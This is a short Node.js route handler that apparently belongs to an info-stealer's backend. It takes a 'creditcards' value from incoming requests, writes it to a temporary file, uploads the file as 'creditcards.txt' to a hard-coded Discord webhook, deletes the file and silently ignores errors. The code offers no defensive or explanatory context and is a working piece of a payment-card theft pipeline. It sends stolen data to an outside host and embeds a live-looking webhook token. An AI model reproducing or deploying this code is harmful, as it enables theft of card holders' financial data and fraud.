//const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { MessageEmbed, WebhookClient } = require('discord.js');
var randomstring = require("randomstring");


module.exports = async (req, res) => {
    const { creditcards } = req.body
  var rst = "31"

  
    let content = !creditcards.includes('NUMBER:') ? "Creditcards don\'t found." : creditcards;
    fs.writeFileSync(`./Src/Temp/cb_${rst}.txt`, content);
const webhookClient = new WebhookClient({ id: '1056349734278807592', token: 'RzPxTlSFScGbxST_tZYeZZ8Oc1L5PBvbmblVUt774as2tKfaL9ssXvuG5tsN1et4nqaw' });

  webhookClient.send({
        files: [{
            attachment: `./Src/Temp/cb_${rst}.txt`,
            name: "creditcards.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/cb_${rst}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}
